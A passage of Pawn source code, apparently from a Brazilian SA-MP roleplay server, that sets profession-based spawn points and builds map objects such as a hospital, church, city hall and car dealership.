		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == DEPUTADO)
	{
	    SetPlayerInterior(playerid, 3);
		SetPlayerPos(playerid, 356.0895,184.2146,1008.3767);
		SetPlayerFacingAngle(playerid, 266.1337);
		SetPlayerColor(playerid, COR_DEPUTADO);
		pInfo[playerid][EntrouL] = true;
		pInfo[playerid][entroupref] = 1;
	}
	if(pInfo[playerid][Prof] == PREFEITO)
	{
	    SetPlayerInterior(playerid, 3);
		SetPlayerPos(playerid, 355.7800,169.0807,1008.3775);
		SetPlayerFacingAngle(playerid, 269.8939);
		SetPlayerColor(playerid, COR_PREFEITO);
		pInfo[playerid][EntrouL] = true;
		pInfo[playerid][entroupref] = 1;
	}
	if(pInfo[playerid][Prof] == COR_GOVERNADOR)
	{
	    SetPlayerInterior(playerid, 3);
		SetPlayerPos(playerid, 358.6187,173.5801,1008.3893);
		SetPlayerFacingAngle(playerid, 269.8938);
		SetPlayerColor(playerid, GOVERNADOR);
		pInfo[playerid][EntrouL] = true;
		pInfo[playerid][entroupref] = 1;
	}
	if(pInfo[playerid][Prof] == ADVOGADO)
	{
		SetPlayerPos(playerid, 1410.7465,-1789.7605,14.0323);
		SetPlayerFacingAngle(playerid, 90.6654);
		SetPlayerColor(playerid, COR_ADVOGADO);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == POL_MILITAR)
	{
		SetPlayerPos(playerid, 1579.4515,-1636.0842,13.5600);
		SetPlayerFacingAngle(playerid, 357.5201);
		SetPlayerColor(playerid, COR_POLMILITAR);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
		pInfo[playerid][entrouDEL] = 0;
	}
	if(pInfo[playerid][Prof] == POL_CIVIL)
	{
		SetPlayerPos(playerid, -1617.7930,685.0938,7.1875);
		SetPlayerFacingAngle(playerid, 93.5196);
		SetPlayerColor(playerid, COR_POLCIVIL);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
		pInfo[playerid][entrouDEL] = 0;
	}
	if(pInfo[playerid][Prof] == GUARDA_TRANSITO)
	{
		SetPlayerPos(playerid, -217.0729,979.0853,19.4997);
		SetPlayerFacingAngle(playerid, 267.3282);
		SetPlayerColor(playerid, COR_GUARDTRANS);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
		pInfo[playerid][entrouDEL] = 0;
	}
	if(pInfo[playerid][Prof] == POL_RODOVIARIO)
	{
		SetPlayerPos(playerid, 627.9603,-571.6725,17.4554);
		SetPlayerFacingAngle(playerid, 271.5475);
		SetPlayerColor(playerid, COR_POLRODOVIARIO);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
		pInfo[playerid][entrouDEL] = 0;
	}
	if(pInfo[playerid][Prof] == POL_FEDERAL)
	{
		SetPlayerPos(playerid, 2250.5000,2488.8735,10.9908);
		SetPlayerFacingAngle(playerid, 88.2532);
		SetPlayerColor(playerid, COR_POLFEDERAL);
		SetPlayerInterior(playerid, 0);
        pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == SEG_VILA)
	{
		SetPlayerPos(playerid, -552.2868,-1015.7592,24.0661);
		SetPlayerFacingAngle(playerid, 240.5695);
		SetPlayerColor(playerid, COR_SEGVILA);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == PORT_VILA)
	{
		SetPlayerPos(playerid, -552.2868,-1015.7592,24.0661);
		SetPlayerFacingAngle(playerid, 240.5695);
		SetPlayerColor(playerid, COR_PORVILA);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == CONTRABANDISTA)
	{
		SetPlayerPos(playerid, 414.6145, 2531.8494, 19.1585);
		SetPlayerFacingAngle(playerid, 83.9372);
		SetPlayerColor(playerid, COR_CONTRABANDISTA);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == BOMBEIRO)
	{
		SetPlayerPos(playerid, -2050.7473, 66.9856, 28.3906);
		SetPlayerFacingAngle(playerid, 98.1014);
		SetPlayerColor(playerid, COR_CONTRABANDISTA);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	SetCameraBehindPlayer(playerid);
}

stock FormatarHorario()
{
	new
		Tempo[64]
	;
	new
		Hora, Minuto
	;
	gettime(Hora, Minuto);
	Hora += FUSORARIO;
    format(Tempo, sizeof(Tempo), "%02d:%02d", Hora, Minuto);
	return Tempo;
}

stock FormatarData()
{
    new
		data[64], ano, mes, dia
	;
	getdate(ano, mes, dia);
	format(data, sizeof(data), "%02d/%02d/%02d", dia, mes, ano);
	TextDrawSetString(Data, data);
	return data;
}

stock ObjetosInSanAndreas()
{
	CreateDynamicObject(2647,0.00000000,0.00000000,0.00000000,0.00000000,0.00000000,0.00000000); //object(airportgate)(2)
	// Casa Matheus
    C_MATHEUS = CreateDynamicObject(980,310.70001221,-1175.90002441,82.40000153,0.00000000,0.00000000,41.99523926); //object(airportgate)(2)
	CreateDynamicObject(3749,311.39999390,-1176.69995117,85.30000305,0.00000000,0.00000000,41.98974609); //object(clubgate01_lax)(1)
	// Porta loteria
	CreateDynamicObject(1567,-2171.10498047,640.00915527,1051.37500000,0.00000000,0.00000000,0.00000000); //
	// Caixas eletrônicos
    CreateDynamicObject(2942, 1363.69995, -1750.09998, 13.2,0,0, 270);
    CreateDynamicObject(2942, 1145.59998, -1772.69995, 16.2,0,0, 180);
    CreateDynamicObject(2942, 1401.19995, -1177.90002, 25.6,0,0, 90);
    CreateDynamicObject(2942, 1928.59998, -1769, 13.2,0,0, 90);
    CreateDynamicObject(2942, 2005.80005, -1408.40002, 16.6,0,0, 0);
    CreateDynamicObject(2942, 1286.80005, -1305.69995, 13.2,0,0, 270);
    CreateDynamicObject(2942, 397.60001, -1806.19995, 7.5,0,0, 180);
	// Bombas Posto Norte
	CreateDynamicObject(1676,998.56805420,-937.61212158,42.90899277,0.00000000,0.00000000,6.99829102); //
	CreateDynamicObject(1676,1002.22772217,-937.06262207,42.90899277,0.00000000,0.00000000,6.99829102); //
	CreateDynamicObject(1676,1005.58190918,-936.56286621,42.90899277,0.00000000,0.00000000,6.99829102); //
	CreateDynamicObject(1676,1009.14178467,-936.08551025,42.90899277,0.00000000,0.00000000,7.00000000); //
	//Hospital
	new paredeh[3];
	new rodape[2];

	paredeh[0] = CreateObject(19450, 294.49411, 230.09360, 998.30109,   0.00000, 0.00000, 0.00000);
 	paredeh[1] = CreateObject(19369, 314.58612, 218.73297, 998.24420,   180.00000, 0.00000, 0.00000);
 	paredeh[2] = CreateObject(1267, 294.29950, 235.72200, 1000.98090,   0.00000, 0.00000, 0.00000);
 	for(new i = 0; i != 2; i++) SetObjectMaterial(paredeh[i],0,14595,"papaerchaseoffice","ab_wallPanel");
	rodape[0] = CreateObject(19449, 294.49814, 230.10895, 994.80518,   0.00000, 0.00000, 0.00000);
	rodape[1] = CreateObject(19369, 314.59195, 218.73151, 997.50421,   180.00000, 0.00000, 0.00000);
	for(new i = 0; i != 2; i++) SetObjectMaterial(rodape[i],0,14595,"papaerchaseoffice","ab_SkirtingGrey");

	// CAMAS //
	CreateObject(1997, 297.31754, 254.48889, 996.04388,   0.00000, 0.00000, 0.00000);
	CreateObject(1997, 299.96182, 254.51231, 996.04388,   0.00000, 0.00000, 0.00000);
	CreateObject(1997, 302.42334, 254.48511, 996.04388,   0.00000, 0.00000, 0.00000);
	CreateObject(1997, 304.91974, 254.43593, 996.04388,   0.00000, 0.00000, 0.00000);

	CreateDynamicObject(14595, 311.49210, 230.25885, 1000.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14598, 311.40533, 230.27367, 1000.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18070, 307.92999, 216.89174, 996.27972,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2008, 310.37964, 217.30437, 995.96881,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1721, 309.02917, 216.41222, 996.02679,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2007, 308.75186, 215.04527, 996.04608,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2828, 310.45688, 215.04599, 996.78833,   0.00000, 0.00000, 36.36000);
	CreateDynamicObject(1892, 314.17368, 218.22568, 996.04633,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2825, 309.53860, 215.15588, 996.78876,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2824, 310.23715, 218.52332, 996.78888,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1817, 317.04294, 229.79242, 996.04510,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2002, 315.32626, 234.78078, 996.04266,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1703, 316.57343, 232.55382, 996.03748,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1703, 319.70856, 231.18964, 996.03748,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1703, 318.59271, 227.98555, 996.03748,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2824, 317.48798, 230.30225, 996.51733,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3395, 309.33417, 255.11909, 996.04413,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3389, 311.54764, 255.19891, 996.04407,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3397, 313.19516, 248.68079, 996.04456,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3383, 311.32465, 252.40175, 996.04437,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1714, 311.42346, 248.85786, 996.04419,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1502, 300.13309, 225.26219, 996.06122,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1523, 310.66821, 243.36731, 996.04529,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2603, 305.90836, 245.35774, 996.46521,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2603, 303.33600, 245.29919, 996.46521,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2603, 300.75562, 245.29405, 996.46521,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2603, 298.33713, 245.21957, 996.46521,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3395, 298.21130, 217.21587, 996.04468,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3397, 295.80652, 218.62759, 996.04492,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3383, 302.95093, 218.47824, 996.04529,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2908, 302.84006, 217.36742, 997.15747,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2907, 302.85129, 217.87984, 997.17743,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2906, 303.11151, 217.95247, 997.09882,   0.00000, 0.00000, -5.40000);
	CreateDynamicObject(2905, 302.95850, 218.70207, 997.23877,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(2905, 302.75009, 218.74481, 997.23877,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(2906, 302.63177, 217.98094, 997.15881,   0.00000, 180.00000, 8.64000);
	CreateDynamicObject(1703, 298.41122, 225.94849, 996.03748,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1536, 314.55746, 217.94666, 996.04681,   0.00000, 0.00000, 90.00000);
	// Auto-Escola
	CreateObject(8230, 1295.90088, -1871.58020, 14.45830,   0.00000, 0.00000, 0.00000);
	CreateObject(8231, 1295.81775, -1871.57104, 14.27830,   0.00000, 0.00000, 0.00000);
	CreateObject(8237, 1301.76318, -1878.29480, 12.57253,   0.00000, 0.00000, 0.00000);
	CreateObject(1502, 1296.98779, -1862.93323, 12.42380,   0.00000, 0.00000, 0.00000);
	// DP LS
	DPWE = CreateObject(3976, 1571.60156, -1675.75000, 35.67970,   0.00000, 0.00000, 0.00000, 50000.0);

	SetObjectMaterial(DPWE, 12, 4141, "civic01_lan", "sl_laglasswall2");
	SetObjectMaterial(DPWE, 9, 6863, "vgsnbuild07", "luxorwall01_128");
	SetObjectMaterial(DPWE, 6, 6863, "vgsnbuild07", "luxorwall01_128");
	SetObjectMaterial(DPWE, 7, 6863, "vgsnbuild07", "luxorwall01_128");
	SetObjectMaterial(DPWE, 5, 6863, "vgsnbuild07", "luxorwall01_128");
	SetObjectMaterial(DPWE, 4, 6863, "vgsnbuild07", "luxorwall01_128");
	SetObjectMaterial(DPWE, 2, 6863, "vgsnbuild07", "luxorwall01_128");
	SetObjectMaterial(DPWE, 8, 6863, "vgsnbuild07", "luxorwall01_128");
	SetObjectMaterial(DPWE, 13, 6863, "vgsnbuild07", "ws_carpark2");
	// Radares
    CreateDynamicObject(18880, 1700.77087, 414.56015, 30.00000,   0.00000, 0.00000, -25.00000);
    CreateDynamicObject(18880, -1220.04248, -769.33087, 63.00000,   0.00000, 0.00000, -77.00000);
    CreateDynamicObject(18880, -143.34355, -1318.30847, 1.40000,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(18880, 660.9880,666.7653, 6.60294,   0.00000, 0.00000, -91.00000);
    CreateDynamicObject(18880, -1637.78394, 2013.41296, 17.66738,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(18880, -2681.42578, 1956.42688, 62.27490,   0.00000, 0.00000, 180.00000);
    CreateDynamicObject(18880, -1772.58240, -1441.72498, 34.25580,   0.00000, 0.00000, -62.00000);
    CreateDynamicObject(18880, -1065.33606, -2857.72314, 66.69350,   0.00000, 0.00000, 90.00000);
    CreateDynamicObject(18880, 2760.43213, -102.90350, 34.08050,   0.00000, 0.00000, -4.00000);
    // Igreja //
   	new virgem = CreateDynamicObjectEx(19449, 2243.42993, -1360.31482, 24.73790,   0.00000, 0.00000, 90.00000);
   	SetDynamicObjectMaterial(virgem,0,5173,"lasground_las2","mural01_LA");
	// chao vermelho //
	tapete[0] = CreateDynamicObjectEx(19448, 2243.40820, -1342.78088, 23.03250,   0.00000, 90.00000, 0.00000);
	tapete[1] = CreateDynamicObjectEx(19448, 2243.40796, -1348.12915, 23.05250,   0.00000, 90.00000, 0.00000);
	tapete[2] = CreateDynamicObjectEx(19448, 2248.21826, -1351.25098, 23.03250,   0.00000, 90.00000, 90.00000);
	tapete[3] = CreateDynamicObjectEx(19448, 2239.23804, -1351.18372, 23.03250,   0.00000, 90.00000, 90.00000);
	tapete[4] = CreateDynamicObjectEx(19448, 2243.39819, -1334.65344, 23.01250,   0.00000, 90.00000, 0.00000);
	tapete[5] = CreateDynamicObjectEx(19448, 2243.46362, -1358.63794, 23.53250,   -0.02000, 90.00000, 0.00000);
	for(new i = 0; i != 6; i++) SetDynamicObjectMaterial(tapete[i],0,10412,"hotel1","carpet_red_256");

	// Teto //
	tetoigreja[0] = CreateDynamicObjectEx(19377, 2239.67603, -1336.26318, 26.58850,   0.00000, 90.00000, 0.00000);
	tetoigreja[1] = CreateDynamicObjectEx(19377, 2248.20020, -1336.28760, 26.60850,   0.00000, 90.00000, 0.00000);
	tetoigreja[2] = CreateDynamicObjectEx(19377, 2239.67432, -1345.87366, 26.58850,   0.00000, 90.00000, 0.00000);
	tetoigreja[3] = CreateDynamicObjectEx(19377, 2248.20923, -1345.84094, 26.60850,   0.00000, 90.00000, 0.00000);
	tetoigreja[4] = CreateDynamicObjectEx(19377, 2239.68433, -1355.47827, 26.58850,   0.00000, 90.00000, 0.00000);
	tetoigreja[5] = CreateDynamicObjectEx(19377, 2248.20410, -1355.40784, 26.60850,   0.00000, 90.00000, 0.00000);
	for(new i = 0; i != 6 ; i++) SetDynamicObjectMaterial(tetoigreja[i],0,1786, "cj_tv", "CJ_Black_metal");
	// parede //

	paredeinteriorigreja[0] = CreateDynamicObjectEx(19450, 2239.25928, -1331.58691, 24.80340,   0.00000, 0.00000, 90.00000);
	paredeinteriorigreja[1] = CreateDynamicObjectEx(19450, 2234.53931, -1336.43335, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[2] = CreateDynamicObjectEx(19450, 2248.23511, -1331.58398, 24.80340,   0.00000, 0.00000, 90.00000);
	paredeinteriorigreja[3] = CreateDynamicObjectEx(19450, 2252.93970, -1336.46777, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[4] = CreateDynamicObjectEx(19450, 2234.54785, -1358.66321, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[5] = CreateDynamicObjectEx(19450, 2239.33398, -1360.40356, 24.80340,   0.00000, 0.00000, 90.00000);
	paredeinteriorigreja[6] = CreateDynamicObjectEx(19450, 2248.39868, -1360.41150, 24.80340,   0.00000, 0.00000, 90.00000);
	paredeinteriorigreja[7] = CreateDynamicObjectEx(19450, 2252.93530, -1358.76392, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[8] = CreateDynamicObjectEx(19404, 2252.92944, -1342.87402, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[9] = CreateDynamicObjectEx(19404, 2252.92944, -1346.07983, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[10] = CreateDynamicObjectEx(19404, 2252.92505, -1349.28186, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[11] = CreateDynamicObjectEx(19404, 2252.92944, -1352.40332, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[12] = CreateDynamicObjectEx(19404, 2234.53931, -1342.81299, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[13] = CreateDynamicObjectEx(19404, 2234.53931, -1346.01331, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[14] = CreateDynamicObjectEx(19404, 2234.54272, -1349.15662, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[15] = CreateDynamicObjectEx(19404, 2234.54224, -1352.32715, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[16] = CreateDynamicObjectEx(19364, 2241.18896, -1360.26904, 24.80340,   0.00000, 0.00000, 90.00000);
	paredeinteriorigreja[17] = CreateDynamicObjectEx(19364, 2237.98511, -1360.27136, 24.80340,   0.00000, 0.00000, 90.00000);
	paredeinteriorigreja[18] = CreateDynamicObjectEx(19364, 2245.67212, -1360.30530, 24.80340,   0.00000, 0.00000, 90.00000);
	paredeinteriorigreja[19] = CreateDynamicObjectEx(19364, 2248.85474, -1360.29285, 24.80340,   0.00000, 0.00000, 90.00000);
	paredeinteriorigreja[20] = CreateDynamicObjectEx(19387, 2245.16235, -1333.03186, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[21] = CreateDynamicObjectEx(19387, 2241.79004, -1333.00903, 24.80340,   0.00000, 0.00000, 0.00000);
	paredeinteriorigreja[22] = CreateDynamicObjectEx(19357, 2243.46558, -1334.54309, 24.80340,   0.00000, 0.00000, 90.00000);
	paredeinteriorigreja[23] = CreateDynamicObjectEx(19403, 2243.47607, -1332.81299, 24.80340,   0.00000, 0.00000, 0.00000);
	for(new i = 0; i != 24; i++) SetDynamicObjectMaterial(paredeinteriorigreja[i],0,4101, "stapl", "sl_laexpowall1");


	chaoigreja[0] = CreateDynamicObjectEx(19379, 2239.78076, -1335.95837, 23.00650,   0.00000, 90.00000, 0.00000);
	chaoigreja[1] = CreateDynamicObjectEx(19379, 2247.91772, -1336.04822, 22.98650,   0.00000, 90.00000, 0.00000);
	chaoigreja[2] = CreateDynamicObjectEx(19379, 2239.56860, -1345.58179, 23.00650,   0.00000, 90.00000, 0.00000);
	chaoigreja[3] = CreateDynamicObjectEx(19379, 2248.31372, -1345.57825, 22.98650,   0.00000, 90.00000, 0.00000);
 	chaoigreja[4] = CreateDynamicObjectEx(14394, 2238.44775, -1352.71484, 22.79360,   0.00000, 0.00000, -90.00000);
	chaoigreja[5] = CreateDynamicObjectEx(14394, 2246.34619, -1352.70935, 22.79360,   0.00000, 0.00000, -90.00000);
	chaoigreja[6] = CreateDynamicObjectEx(14394, 2248.96533, -1352.74121, 22.79360,   0.00000, 0.00000, -90.00000);
	chaoigreja[7] = CreateDynamicObjectEx(19379, 2239.87549, -1358.52954, 23.50650,   0.00000, 90.00000, 0.00000);
	chaoigreja[8] = CreateDynamicObjectEx(19379, 2247.75146, -1358.44141, 23.48650,   0.00000, 90.00000, 0.00000);
	for(new i = 0; i != 9; i++) SetDynamicObjectMaterial(chaoigreja[i],0,14595, "papaerchaseoffice", "gun_floor1");
	// portas //

	portasigreja[0] = CreateDynamicObjectEx(1506, 2252.85864, -1334.42822, 23.07500,   0.00000, 0.00000, -90.00000);
	portasigreja[1] = CreateDynamicObjectEx(1506, 2252.85278, -1332.98462, 23.07500,   0.00000, 0.00000, -90.00000);
	portasigreja[2] = CreateDynamicObjectEx(1506, 2234.58667, -1334.31323, 23.07500,   0.00000, 0.00000, -90.00000);
	portasigreja[3] = CreateDynamicObjectEx(1506, 2234.58691, -1332.84753, 23.07500,   0.00000, 0.00000, -90.00000);
	for(new i = 0; i != 4; i++) SetDynamicObjectMaterial(portasigreja[i],0,1491, "int_doors", "CJ_WOODDOOR2");

	// Cadeiras //

	CreateDynamicObject(2639, 2251.13232, -1348.06860, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2249.04614, -1348.07996, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2246.94556, -1348.08130, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2246.94556, -1345.30078, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2248.95605, -1345.30835, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2251.05811, -1345.30103, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2251.16577, -1342.46582, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2246.94556, -1342.46350, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2249.06006, -1342.46631, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2246.94556, -1339.73218, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2249.05078, -1339.74255, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2251.15283, -1339.74512, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2240.09229, -1348.08130, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2238.00610, -1348.08130, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2235.92627, -1348.08130, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2240.09229, -1345.30078, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2238.01929, -1345.28857, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2235.99854, -1345.28149, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2240.09229, -1342.46350, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2240.09229, -1339.73218, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2238.02954, -1339.72046, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2235.99854, -1339.73401, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2238.08960, -1342.46191, 23.55160,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2639, 2235.99854, -1342.45154, 23.55160,   0.00000, 0.00000, 180.00000);

	// resto objetos igreja //
	CreateDynamicObject(3858, 2253.02002, -1347.06519, 23.11942,   0.00000, 0.00000, -45.06001);
	CreateDynamicObject(3858, 2234.54028, -1346.39722, 23.11942,   0.00000, 0.00000, -45.06001);
	CreateDynamicObject(8675, 2243.58179, -1346.99207, 16.85260,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(8675, 2247.30981, -1346.95996, 16.83260,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 2245.67212, -1360.30530, 24.80340,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 2248.85474, -1360.29285, 24.80340,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2208, 2242.18579, -1355.19946, 23.57750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2894, 2243.40845, -1355.41528, 24.46110,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2869, 2242.35181, -1355.02686, 23.80080,   0.00000, 0.00000, -36.06000);
	CreateDynamicObject(2869, 2244.51782, -1355.02686, 23.80080,   0.00000, 0.00000, -36.06000);
	CreateDynamicObject(2229, 2234.66650, -1360.10962, 23.56820,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2229, 2252.04370, -1360.12158, 23.56820,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3280, 2243.51392, -1333.07043, 24.97240,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3280, 2243.51782, -1332.34998, 24.97240,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(1714, 2243.96362, -1331.95886, 23.10091,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1714, 2243.05273, -1331.90576, 23.10091,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 2245.21143, -1333.77563, 23.07500,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1502, 2241.76465, -1333.73645, 23.07500,   0.00000, 0.00000, 90.00000);

    // Prefeitura
	// NEW PREFEITURA //
	new prefeitura = CreateObject(3980, 1481.18750, -1785.07031, 22.38280,   0.00000, 0.00000, 0.00000, 50000.0);
	new prefeitura1 = CreateObject(4002, 1479.86719, -1790.39844, 56.02340,   0.00000, 0.00000, 0.00000, 50000.0);

	// parte de baixo //
	SetObjectMaterial(prefeitura, 0, 6060, "shops2_law", "bevdoor01_law");
	SetObjectMaterial(prefeitura, 1, 4101, "stapl", "concretenewb256");
	SetObjectMaterial(prefeitura, 2, 4101, "stapl", "sl_flagstone1");
	SetObjectMaterial(prefeitura, 3, 4101, "stapl", "sl_laexpowall1");
	SetObjectMaterial(prefeitura, 4, 4101, "stapl", "sl_laexpowall1");
	SetObjectMaterial(prefeitura, 5, 4101, "stapl", "concretenewb256");

	SetObjectMaterial(prefeitura, 8, 4101, "stapl", "sl_laexpowall1");
	SetObjectMaterial(prefeitura, 10, 4101, "stapl", "sl_laexpowall1");
	//-----------//

	// parte de cima //
	SetObjectMaterial(prefeitura1, 0, 4101, "stapl", "sl_laexpowall1");
	SetObjectMaterial(prefeitura1, 1, 4141, "civic01_lan", "sl_laglasswall2");
	SetObjectMaterial(prefeitura1, 2, 4101, "stapl", "concretenewb256");
	SetObjectMaterial(prefeitura1, 3, 4101, "stapl", "sl_laexpowall1");
	SetObjectMaterial(prefeitura1, 4, 4101, "stapl", "concretenewb256");
	SetObjectMaterial(prefeitura1, 5, 4141, "civic01_lan", "sl_laglasswall2");
	//---------//
	// Concessionária Grotti
	// CONCE ///

	new WORLDconce = CreateObject(19353, 542.3729, -1293.4982, 29.7622, 0.0000, 0.0000, 88.2885);
	SetObjectMaterialText(WORLDconce, "WORLD", 0, 50, "Arial", 40, 1, -1, 0, 1);

	new evolu = CreateObject(19353, 543.4361, -1293.5854, 27.7083, 0.0000, 0.0000, 90.4575);
	SetObjectMaterialText(evolu, "EVOLU", 0, 50, "Arial", 40, 1, -1, 0, 1);

	new tion = CreateObject(19353, 540.8453, -1293.4906, 27.6922, 0.0000, 0.0000, 91.7116);
	SetObjectMaterialText(tion, "TION", 0, 50, "Arial", 40, 1, -1, 0, 1);


	new conce = CreateObject(6337, 536.13281, -1291.67969, 23.46880,   0.00000, 0.00000, 0.00000);
	SetObjectMaterial(conce, 1, 5886, "garag3_lawn", "bluestucco1");



	conceblue[0] = CreateDynamicObjectEx(19358, 542.34644, -1294.19678, 20.54100,   0.00000, 0.00000, 90.00000);
	conceblue[1] = CreateDynamicObjectEx(19358, 542.34070, -1294.21594, 22.68000,   0.00000, 0.00000, 90.00000);
	conceblue[2] = CreateDynamicObjectEx(19431, 544.87518, -1293.95081, 25.16000,   90.00000, 0.00000, 90.00000);
	conceblue[3] = CreateDynamicObjectEx(19431, 541.39539, -1293.95422, 25.16000,   90.00000, 0.00000, 90.00000);
	conceblue[4] = CreateDynamicObjectEx(19431, 539.11517, -1293.94836, 25.16000,   90.00000, 0.00000, 90.00000);
	conceblue[5] = CreateDynamicObjectEx(19431, 540.75586, -1293.52136, 17.05360,   0.00000, 0.00000, 0.00000);
	conceblue[6] = CreateDynamicObjectEx(19431, 543.90479, -1293.46802, 17.05360,   0.00000, 0.00000, 0.00000);
	conceblue[7] = CreateDynamicObjectEx(19431, 542.27997, -1293.53333, 18.84000,   0.00000, 90.00000, 0.00000);
	conceblue[8] = CreateDynamicObjectEx(19454, 547.94568, -1298.36511, 29.76260,   0.00000, 0.00000, 0.00000);
	conceblue[9] = CreateDynamicObjectEx(19454, 536.62903, -1298.49670, 29.76260,   0.00000, 0.00000, 0.00000);
	conceblue[10] = CreateDynamicObjectEx(19454, 541.38104, -1303.26318, 29.76260,   0.00000, 0.00000, 90.00000);
	conceblue[11] = CreateDynamicObjectEx(19454, 543.10205, -1293.60156, 29.76260,   0.00000, 0.00000, 90.00000);
	conceblue[12] = CreateDynamicObjectEx(19454, 541.33667, -1293.62170, 29.76260,   0.00000, 0.00000, 90.00000);
